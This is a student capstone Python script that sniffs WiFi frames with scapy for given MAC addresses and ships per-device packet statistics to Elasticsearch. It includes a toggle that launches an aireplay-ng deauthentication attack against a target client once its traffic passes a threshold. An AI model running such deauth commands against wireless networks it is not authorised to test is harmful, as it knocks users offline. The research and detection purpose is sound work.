#!/usr/bin/env python3
# Jordan Idler
# CYBV498 Capstone
# November 22nd 2020
# Purpose: Provide code to reporoduce capstone results

from scapy.all import *
from time import sleep, time
from signal import signal, SIGINT
from datetime import datetime
from elasticsearch import Elasticsearch,helpers
import threading,queue,sys,os

ELASTIC ="https://USER:KEY@SERVER:PORT/"
SEND_TIME = 15

#This function launches an aireplay attack. This is more reliable than making our own attack.
def detection(router,device,card):
	if (detection.running == False):
		detection.running = True
		if (detection.attackWifi):
			t = os.system("sudo aireplay-ng -0 10 -a %(router)s -c %(device)s %(card)s >/dev/null 2>&1" % locals())
		detection.running = False

# 0  = Waiting
# 1  = Started
# -1 = Error
def client():
    packets = 0
    es = Elasticsearch(hosts=ELASTIC)
    if not es.ping():
        client.client_status = -1
        return
    client.client_status = 1
    while True:
        data = send_q.get()
        if data == -1: return
        try:
            for router in list(data):
                if (len(list(data[router])) > 0):
                	for device in list(data[router]):
                		if (data[router][device]["TA"]["total"] == 0 or data[router][device]["RA"]["total"] == 0):
                			del data[router][device]
                	hr = helpers.bulk(es, list(data[router].values()))
            del data
            if packets == 0:
            	print("Data Sent!")
            	packets = 1
        except:
            send_q.put(data)
            print("WARNING: ERROR SENDING DATA")
            sleep(.5)

#Logging for later creation.
def log():
    while(True):
        data = log_q.get()
        if data == -1: return

#Parses packet to match one passed at startup
def packet_handler(pkt):
    if pkt.haslayer(Dot11) and (pkt.addr1 in mac_address) and pkt.addr2:
        packet_q.put(pkt)
    elif (pkt.haslayer(Dot11) and (pkt.addr2 in mac_address)and pkt.addr1):
        if pkt.addr1=="ff:ff:ff:ff:ff:ff":
            return
        else:
            packet_q.put(pkt)
    return

def process_packets():
    #Set deauth settings
    deauth={"device":"","data":0,"timer":0}
    while not stopFilter(""):
        addresses={}
        #15 second timer to send data
        timer = int(time()+SEND_TIME)
        while (int(time())<timer):
            #Get packet from Queue
            pkt = packet_q.get()
            if pkt == -1: return
            try:
                data = {}
                #Determine if Received or Transferred packet
                if pkt.addr1 in mac_address:
                    device = pkt.addr2
                    router = pkt.addr1
                else:
                    device = pkt.addr1
                    router = pkt.addr2
                #If we have not seen this router in the last 15 seconds
                if router not in addresses.keys():
                    addresses[router]={}
                #if we should be deauthing this device
                if (device == process_packets.deauthDevice and (deauth["device"] != device)):
                    deauth["device"]=device
                    deauth["data"]=0
                    deauth["timer"]=int(time())
                #If we have not seen the device in 15 seconds
                if device not in addresses[router].keys():
                    addresses[router][device] ={
                        "_index": "prodv3-host",
                        "identifier": identifier,
                        "host_mac" : router,
                        "device_mac" : device,
                        "timestamp" :datetime.utcnow(),
                        "signal"  : 0,
                        "bytesData": 0,
                        "total": 0,
                        "RA" : {
                            "total":0,
                            0:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                            1:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                            2:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                        },
                        "TA" : {
                            "total":0,
                            0:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                            1:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                            2:{0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0,14:0,15:0,"total":0},
                        }
                    }
                addresses[router][device]["total"] += 1
                #Start forming packet
                if device == pkt.addr1:
                    packet_direction = "RA"
                else:
                    packet_direction = "TA"
                    addresses[router][device]["signal"] = pkt.dBm_AntSignal
                addresses[router][device][packet_direction]["total"] += 1


                if hasattr(pkt, "data"):
                    packetSize = len(pkt.data)
                    addresses[router][device]["bytesData"] +=  packetSize
                    if (device == deauth["device"]):
                    	deauth["data"] +=  packetSize

                if (hasattr(pkt, "type") and pkt.type < 3 and pkt.type >= 0):
                    addresses[router][device][packet_direction][pkt.type]["total"] += 1
                    if (hasattr(pkt, "subtype") and pkt.subtype < 15 and pkt.subtype >= 0):
                        addresses[router][device][packet_direction][pkt.type][pkt.subtype] += 1

                if (device ==  deauth["device"] and deauth["data"] > 1000 and (int(time()) - deauth["timer"] < 5)):
                    deauth["timer"] = int(time())
                    deauth["data"] = 0
                    Thread(detection(router, device, mon_device)).start()
                elif(device ==  deauth["device"] and deauth["data"] > 1000 ):
                	deauth["timer"] = int(time())
                	deauth["data"] = 0


            except IOError:
                print("Packet Parse Failed!")
                pass
        send_q.put(addresses.copy())
        del pkt

def stopFilter(data):
    if data == "end":
        stopFilter.running == False
    return not(stopFilter.running)


def main():
    print("Jordan Idler\nCapstone Project: Cyber Operations, Engineering\n\n\nStarting Elasticsearch Client")
    detection.running = False
    detection.attackWifi = False
    logT.start()
    print("Logging Started")

    #Start Elasticsearch thread
    client.client_status = 0
    clientT.start()
    while client.client_status == 0:
        pass
    if client.client_status == -1:
        print("Error: Client can not start. check logs")
        return -1
    print("Elastic Search Loaded")


    mac_address.append(sys.argv[3])

    if len(sys.argv) > 4:
        print("2nd MAC address")
        mac2 = sys.argv[4]
        mac_address.append(sys.argv[4])
    if len(sys.argv) > 5:
        print("Deauth Device Set!")
        process_packets.deauthDevice = sys.argv[5]
    process_packetsT = Thread(target=process_packets,)
    process_packetsT.start()
    Thread(target=sniff,kwargs=dict(iface=mon_device, prn = packet_handler, stop_filter=stopFilter,store=0)).start()
    while(len(sys.argv) > 5 and not stopFilter("")):
        if not detection.attackWifi:
            input("Press Enter To Attack")
        else:
            input("Press Enter To Disable")
        detection.attackWifi = not detection.attackWifi
    process_packetsT.join()




if __name__ == '__main__':
    #Globals Vars
    process_packets.deauthDevice =  ""
    stopFilter.running = True
    mac_address = []
    mon_device = sys.argv[1]
    identifier = sys.argv[2]
    #Globals Vars Qs
    send_q = queue.Queue()
    log_q = queue.Queue()
    packet_q = queue.Queue()
    #Globals Threads
    logT = Thread(target=log,)
    clientT = Thread(target=client,)

    main()

    log_q.put(-1)
    logT.join()
    clientT.join()
